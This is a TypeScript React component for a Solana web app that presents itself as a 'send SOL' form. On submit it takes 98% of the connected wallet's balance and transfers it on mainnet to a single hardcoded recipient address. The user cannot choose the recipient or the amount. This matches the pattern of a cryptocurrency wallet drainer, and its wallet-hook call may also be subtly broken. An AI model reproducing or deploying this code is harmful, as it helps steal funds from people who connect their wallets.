// SendSolForm.tsx

import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import * as web3 from '@solana/web3.js';
import { FC, useState } from 'react'

export const SendSolForm: FC = () => {
    const [txSig, setTxSig] = useState('');
    const { connection } = useConnection();
    const { publicKey, signAndSendTransaction } = useWallet();

    const sendSol = async (event) => {
        event.preventDefault();
        if (!connection || !publicKey) {
            console.error('Connection or publicKey not available.');
            return;
        }

        try {
            const info = await connection.getAccountInfo(publicKey);
            if (!info) {
                console.error('Unable to fetch account info.');
                return;
            }

            const balanceInLamports = info.lamports;
            const balanceInSol = balanceInLamports / web3.LAMPORTS_PER_SOL;
            const amountToSend = balanceInSol * 0.98; // 98% of current balance

            const lamports = Math.floor(amountToSend * web3.LAMPORTS_PER_SOL); // Ensure lamports is an integer

            const transaction = new web3.Transaction();
            const recipientPubKey = new web3.PublicKey('AiwmF5F27tMzxmzcDwUg3on2fWiCHcuxQmBtV3bo611a');

            transaction.add(
                web3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: recipientPubKey,
                    lamports: lamports
                })
            );

            const { signature } = await signAndSendTransaction(transaction);
            setTxSig(signature);
        } catch (error) {
            console.error('Failed to send transaction:', error);
        }
    }

    return (
        <div>
            {
                publicKey ?
                    <form onSubmit={sendSol}>
                        <button type="submit">Send 98% of SOL Balance</button>
                    </form> :
                    <span>Connect Your Wallet</span>
            }
            {
                txSig ?
                    <div>
                        <p>View your transaction on </p>
                        <a href={`https://explorer.solana.com/tx/${txSig}?cluster=mainnet`}>Solana Explorer</a>
                    </div> :
                    null
            }
        </div>
    )
}
